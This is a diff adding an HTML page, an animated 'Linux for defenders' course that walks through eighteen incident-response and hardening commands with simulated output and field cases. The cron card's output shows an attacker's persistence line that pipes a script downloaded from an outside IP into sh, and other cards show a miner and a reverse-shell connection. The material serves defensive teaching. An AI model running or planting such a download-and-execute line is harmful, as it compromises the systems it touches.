@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Linux for Defenders: an animated command course</title>
+<style>
+:root{--bg:#0f1724;--panel:#16212f;--ink:#e3e9f2;--mute:#8d9bb0;--cmd:#7fd6ff;--warn:#ffb454;--bad:#ff7a90;--ok:#9be7c4;--line:#26354a;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media(prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#f1f4f9;--panel:#fff;--ink:#14202f;--mute:#5a6a80;--cmd:#0a6aa1;--warn:#a85d00;--bad:#c21f43;--ok:#11785a;--line:#d3dbe8}}
+:root[data-theme="light"]{--bg:#f1f4f9;--panel:#fff;--ink:#14202f;--mute:#5a6a80;--cmd:#0a6aa1;--warn:#a85d00;--bad:#c21f43;--ok:#11785a;--line:#d3dbe8}
+*{box-sizing:border-box}html{scroll-padding-top:70px}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.6 Georgia,"Iowan Old Style",serif}
+.m{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace}
+header{padding:56px 20px 40px;max-width:1000px;margin:auto}
+h1{font:700 clamp(32px,6vw,58px)/1.05 Georgia,serif;margin:0 0 14px;letter-spacing:-.02em}
+.sub{color:var(--mute);max-width:60ch;margin:0 0 26px}
+.hero{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px 20px;min-height:132px;font-size:15px;overflow:hidden;position:relative}
+.hero:after{content:"";position:absolute;left:0;right:0;height:40px;top:-40px;background:linear-gradient(transparent,color-mix(in srgb,var(--cmd) 14%,transparent),transparent);animation:sweep 5s linear infinite}
+@keyframes sweep{to{top:100%}}
+nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);border-bottom:1px solid var(--line);padding:10px 20px}
+.nin{max-width:1000px;margin:auto;display:flex;gap:8px;overflow-x:auto;align-items:center}
+.chip{border:1px solid var(--line);background:none;color:var(--ink);padding:6px 14px;border-radius:99px;cursor:pointer;font:14px ui-monospace,Menlo,monospace;white-space:nowrap;transition:background .2s,color .2s}
+.chip[aria-pressed=true]{background:var(--cmd);color:var(--bg);border-color:var(--cmd)}
+.prog{margin-left:auto;min-width:110px;font:13px ui-monospace,monospace;color:var(--mute);text-align:right}
+.bar{height:3px;background:var(--line);border-radius:2px;margin-top:4px;overflow:hidden}.bar i{display:block;height:100%;width:0;background:var(--ok);transition:width .5s}
+main{max-width:1000px;margin:auto;padding:10px 20px 80px}
+.mod{margin:44px 0 6px}.mod h2{font:700 28px Georgia,serif;margin:0}.mod p{color:var(--mute);margin:4px 0 0}
+.card{display:grid;grid-template-columns:1fr 1.15fr;gap:22px;padding:26px 0;border-bottom:1px solid var(--line)}
+@media(max-width:760px){.card{grid-template-columns:1fr}}
+.card h3{font:700 22px ui-monospace,Menlo,monospace;margin:0 0 8px;color:var(--cmd)}
+.card b{color:var(--warn)}.card p{margin:0 0 12px}
+.case{border-left:3px solid var(--warn);padding:2px 0 2px 14px;color:var(--ink)}
+.term{background:#0a111b;color:#dbe6f5;border:1px solid var(--line);border-radius:8px;overflow:hidden;align-self:start}
+.tb{display:flex;align-items:center;gap:6px;padding:8px 12px;background:#121c2b;font-size:12px;color:#8d9bb0}
+.tb i{width:9px;height:9px;border-radius:50%;background:#2c3c55}.tb button{margin-left:auto;background:none;border:1px solid #2c3c55;color:#9fb0c8;border-radius:5px;padding:2px 9px;cursor:pointer;font:12px ui-monospace,monospace}
+.tb button:hover,.tb button:focus-visible{color:#fff;border-color:#7fd6ff;outline:none}
+.scr{padding:12px 14px;min-height:150px;font-size:13px;line-height:1.55;white-space:pre-wrap;word-break:break-all}
+.scr .p{color:#7fd6ff}.scr .l{animation:in .35s}.scr .h{color:#ff7a90}.scr .y{color:#ffb454}.scr .g{color:#9be7c4}
+.caret:after{content:"▌";animation:bl 1s steps(1) infinite;color:#7fd6ff}
+@keyframes bl{50%{opacity:0}}@keyframes in{from{opacity:0;transform:translateX(-6px)}}
+.done{margin-top:6px;background:none;border:1px solid var(--line);color:var(--ink);padding:5px 12px;border-radius:6px;cursor:pointer;font:14px Georgia,serif;transition:all .25s}
+.done[aria-pressed=true]{background:var(--ok);color:#0a1a14;border-color:var(--ok)}
+footer{max-width:1000px;margin:auto;padding:0 20px 50px;color:var(--mute);font-size:14px}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style></head><body>
+<header>
+<h1>Linux for defenders</h1>
+<p class="sub">Eighteen commands you will reach for in real incidents. Each one plays out in a live terminal, explains when you need it, and ends with a case from the field. Press play, then mark it learned.</p>
+<div class="hero m" id="hero" aria-live="off"></div>
+</header>
+<nav><div class="nin" id="nav"></div></nav>
+<main id="main"></main>
+<footer>Practice only on systems you own or are explicitly authorized to test. Output shown is simulated, with documentation IP ranges.</footer>
+<script>
+const M={recon:["Recon","See what an attacker sees: hosts, ports, DNS, headers."],net:["Network","Find live connections, capture traffic, test reachability."],fs:["Files and permissions","Spot dangerous permissions and verify integrity."],logs:["Logs and forensics","Turn raw logs into evidence."],proc:["Processes and persistence","Catch what is running and what will run again."],priv:["Privilege and hardening","Limit damage and lock the doors."]};
+const D=[
+["recon","nmap -sV -p- 192.0.2.10","Scans ports and fingerprints service versions. Run it against your own assets to find what is exposed before someone else does.","An audit finds a forgotten test database on port 6379 open to the internet. Two minutes later it is firewalled.","Starting Nmap 7.94\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.9\n80/tcp    open  http    nginx 1.18\n<y>6379/tcp  open  redis   Redis 6.0 (no auth)</y>\n<h>Exposed service: investigate</h>"],
+["recon","dig +short TXT example.com","Queries DNS records. Use it to check SPF/DKIM, spot suspicious subdomains and trace phishing infrastructure.","A phishing mail claims to be from your CEO. The SPF record is missing, which explains why it passed filters.","<y>\"v=spf1 include:_spf.mail.example ~all\"</y>\n\"google-site-verification=a1B2...\"\n<h>Soft-fail ~all: spoofing still possible</h>"],
+["recon","curl -sI https://example.com","Fetches only response headers. Quick check for missing security headers and server leaks.","A pentest report flags missing HSTS. You confirm it in seconds and verify the fix after deploy.","HTTP/2 200\nserver: nginx/1.18.0\n<y>x-powered-by: PHP/7.4.3</y>\n<h>Missing: strict-transport-security</h>"],
+["net","ss -tulpn","Lists listening sockets and the process that owns each. Modern replacement for netstat.","A server is slow. You find an unknown process listening on port 4444, a classic reverse-shell handler port.","Netid State  Local:Port  Process\ntcp   LISTEN 0.0.0.0:22   sshd\ntcp   LISTEN 0.0.0.0:443  nginx\n<h>tcp   LISTEN 0.0.0.0:4444 \"python3\" pid=3191</h>"],
+["net","sudo tcpdump -i eth0 -nn port 53","Captures packets live. Use it when logs lie or are missing, and you need ground truth on the wire.","A host makes thousands of DNS requests with long random names. That is DNS tunneling, so you isolate it.","IP 10.0.0.8 > 10.0.0.2: A? <y>x9fk2.q8s7dd0a1.evil.example</y>\nIP 10.0.0.8 > 10.0.0.2: A? <y>m3p0z.k2n1ee9b4.evil.example</y>\n<h>... 4,812 packets in 10s</h>"],
+["net","nc -zv 10.0.0.5 22 80 3306","Netcat tests whether ports are reachable. Verify firewall rules from the viewpoint of a given host.","After a firewall change, you confirm the app tier can no longer reach the database from the DMZ.","<g>10.0.0.5 22 open</g>\n<g>10.0.0.5 80 open</g>\n<h>10.0.0.5 3306: Connection refused</h>"],
+["fs","find / -perm -4000 -type f 2>/dev/null","Lists SUID binaries, which run with their owner's rights. Attackers abuse unusual ones for root.","After a breach you compare this list to a clean baseline and find /tmp/.x owned by root with SUID set.","/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/mount\n<h>/tmp/.x</h>"],
+["fs","chmod 640 secrets.env && chown root:app secrets.env","Controls who can read, write or run a file. Least privilege starts here.","A scan shows API keys readable by every user. You tighten the file, and now only the app group can read it.","$ ls -l secrets.env\n<h>-rw-rw-rw- 1 app app 214 secrets.env</h>\n$ chmod 640 ...\n<g>-rw-r----- 1 root app 214 secrets.env</g>"],
+["fs","sha256sum -c SHA256SUMS","Verifies file integrity against known hashes. Detects tampered downloads and replaced system binaries.","You download a tool and the hash does not match the vendor's. The mirror was compromised.","<g>installer.sh: OK</g>\n<h>agent.bin: FAILED</h>\nsha256sum: WARNING: 1 computed checksum did NOT match"],
+["logs","grep \"Failed password\" /var/log/auth.log | tail -3","Searches text for patterns. Your first move for any log triage.","Monday morning, auth.log shows many failures for root from one address, which is a brute-force attempt.","<y>Oct 9 03:11:02 sshd: Failed password for root from 203.0.113.45</y>\n<y>Oct 9 03:11:04 sshd: Failed password for root from 203.0.113.45</y>\n<y>Oct 9 03:11:06 sshd: Failed password for admin from 203.0.113.45</y>"],
+["logs","awk '/Failed/{print $11}' auth.log | sort | uniq -c | sort -rn | head","Chains tools: extract a field, count, rank. This pipeline turns noise into a top-offenders list.","You rank attacker IPs and block the top three in the firewall, cutting failed logins by 90%.","<h>  4812 203.0.113.45</h>\n   377 198.51.100.7\n    41 192.0.2.99"],
+["logs","journalctl -u ssh --since \"1 hour ago\" -p warning","Queries the systemd journal by service, time and priority. Precise timelines for incident response.","You scope an incident to a single hour, and see the successful login right after 40 failures.","<y>03:11 Failed password ... (x40)</y>\n<h>03:14 Accepted password for deploy from 203.0.113.45</h>\n<h>Likely compromise of 'deploy'</h>"],
+["logs","last -a | head -4; lastb | head -2","Shows successful logins (last) and failed ones (lastb). Reveals who came in, when and from where.","A service account logged in from a foreign IP at 3am, and you open an incident.","deploy pts/0 Thu Oct 9 03:14 still logged in <h>203.0.113.45</h>\nalice  pts/1 Thu Oct 9 09:02 - 11:40  10.0.0.21"],
+["proc","ps auxf --sort=-%cpu | head -4","Shows running processes as a tree, sorted by CPU. Spot miners, shells and odd parent-child chains.","A CPU alarm leads to a process called kworkerds, a fake kernel thread running a crypto miner from /tmp.","USER   PID %CPU COMMAND\nwww   2210 0.5 nginx: worker\n<h>www   3191 97.8 \\_ /tmp/.kworkerds -o pool.example:443</h>"],
+["proc","sudo lsof -i -P -n | grep ESTABLISHED","Lists open network files per process. Maps outbound connections to the program that opened them.","A web server process holds an outbound connection to an unknown IP: possible command-and-control.","nginx  812 TCP 10.0.0.5:443->10.0.0.40:51022\n<h>python3 3191 TCP 10.0.0.5:51877->198.51.100.77:4444</h>"],
+["proc","crontab -l; ls /etc/cron.d","Shows scheduled jobs. Attackers use cron to survive reboots and cleanups.","You killed the miner, but it returned. A cron line re-downloaded it every 5 minutes.","<h>*/5 * * * * curl -s http://198.51.100.77/a.sh | sh</h>\n/etc/cron.d/popularity-contest"],
+["priv","sudo -l","Shows what the current user may run as root. Defenders audit it, attackers enumerate it.","A low-privilege account can run vim as root, which gives a trivial shell escape. You remove that rule.","User deploy may run:\n<h>(root) NOPASSWD: /usr/bin/vim</h>\n(root) /usr/bin/systemctl restart app"],
+["priv","sudo ufw default deny incoming && sudo ufw allow 22/tcp && sudo ufw enable","Sets a deny-by-default host firewall. Only what you explicitly allow can reach the machine.","New server, in minutes: default deny, SSH only from the admin range, then re-run nmap to prove it.","<g>Default incoming policy changed to 'deny'</g>\n<g>Rule added</g>\n<g>Firewall is active and enabled on system startup</g>"]
+];
+const esc=s=>s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/&lt;(\/?)([yhg])&gt;/g,"<$1$2>");
+const fmt=s=>s.replace(/&/g,"&amp;").replace(/<(?!\/?[yhg]>)/g,"&lt;");
+const RM=matchMedia("(prefers-reduced-motion:reduce)").matches;
+let done={};try{done=JSON.parse(localStorage.getItem("lx")||"{}")}catch(e){}
+const save=()=>{try{localStorage.setItem("lx",JSON.stringify(done))}catch(e){}};
+const sleep=ms=>new Promise(r=>setTimeout(r,RM?0:ms));
+async function play(scr,cmd,out,tok){
+ scr.innerHTML='<span class="p">$ </span><span class="c"></span><span class="caret"></span>';
+ const c=scr.querySelector(".c");
+ for(const ch of cmd){if(scr._t!==tok)return;c.textContent+=ch;await sleep(22)}
+ await sleep(300);scr.querySelector(".caret").remove();
+ for(const ln of out.split("\n")){if(scr._t!==tok)return;
+  const d=document.createElement("div");d.className="l";d.innerHTML=fmt(ln);scr.appendChild(d);await sleep(260)}
+}
+function run(scr,cmd,out){scr._t=(scr._t||0)+1;play(scr,cmd,out,scr._t)}
+const main=document.getElementById("main"),nav=document.getElementById("nav");
+let io=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting&&!e.target._p){e.target._p=1;run(e.target,e.target.dataset.c,e.target.dataset.o)}}),{threshold:.6});
+Object.entries(M).forEach(([k,[t,d]])=>{
+ const s=document.createElement("section");s.id=k;s.dataset.m=k;
+ s.innerHTML=`<div class="mod"><h2>${t}</h2><p>${d}</p></div>`;
+ D.forEach((x,i)=>{if(x[0]!==k)return;
+  const a=document.createElement("article");a.className="card";
+  a.innerHTML=`<div><h3>${x[1].split(" ")[0]==="sudo"?x[1].split(" ").slice(0,2).join(" "):x[1].split(" ")[0]}</h3><p><b>Context. </b>${x[2]}</p><p class="case"><b>Case. </b>${x[3]}</p><button class="done" aria-pressed="${!!done[i]}">Mark learned</button></div>
+  <div class="term m"><div class="tb"><i></i><i></i><i></i><span>bash</span><button>replay</button></div><div class="scr" data-c="${x[1].replace(/"/g,"&quot;")}" data-o="${x[4].replace(/"/g,"&quot;")}"></div></div>`;
+  const scr=a.querySelector(".scr");io.observe(scr);
+  a.querySelector(".tb button").onclick=()=>run(scr,x[1],x[4]);
+  const b=a.querySelector(".done");b.onclick=()=>{done[i]=!done[i];b.setAttribute("aria-pressed",!!done[i]);save();upd()};
+  s.appendChild(a)});
+ main.appendChild(s);
+ const c=document.createElement("button");c.className="chip";c.textContent=t;c.setAttribute("aria-pressed","false");
+ c.onclick=()=>{document.getElementById(k).scrollIntoView({behavior:RM?"auto":"smooth"})};c.dataset.k=k;nav.appendChild(c)});
+const pg=document.createElement("div");pg.className="prog";pg.innerHTML='<span id="pt"></span><div class="bar"><i id="pb"></i></div>';nav.appendChild(pg);
+function upd(){const n=Object.values(done).filter(Boolean).length;pt.textContent=n+" of "+D.length+" learned";pb.style.width=(n/D.length*100)+"%"}upd();
+new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting)nav.querySelectorAll(".chip").forEach(c=>c.setAttribute("aria-pressed",c.dataset.k===e.target.id))}),{rootMargin:"-30% 0px -60% 0px"}).observe&&document.querySelectorAll("section[data-m]").forEach(s=>new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting)nav.querySelectorAll(".chip").forEach(c=>c.setAttribute("aria-pressed",c.dataset.k===s.id))}),{rootMargin:"-30% 0px -60% 0px"}).observe(s));
+const H=["nmap -sV -p- 192.0.2.10","ss -tulpn","grep 'Failed password' auth.log","find / -perm -4000","tcpdump -i eth0 -nn"];
+const hero=document.getElementById("hero");let hi=0;
+(async function loop(){while(1){hero.firstChild&&0;const sc=document.createElement("div");hero.innerHTML="";hero.appendChild(sc);sc._t=1;
+ await play(sc,H[hi%H.length],["<g>reading the network...</g>","<y>signal found</y>"].join("\n"),1);await sleep(1800);hi++}})();
+</script></body></html>
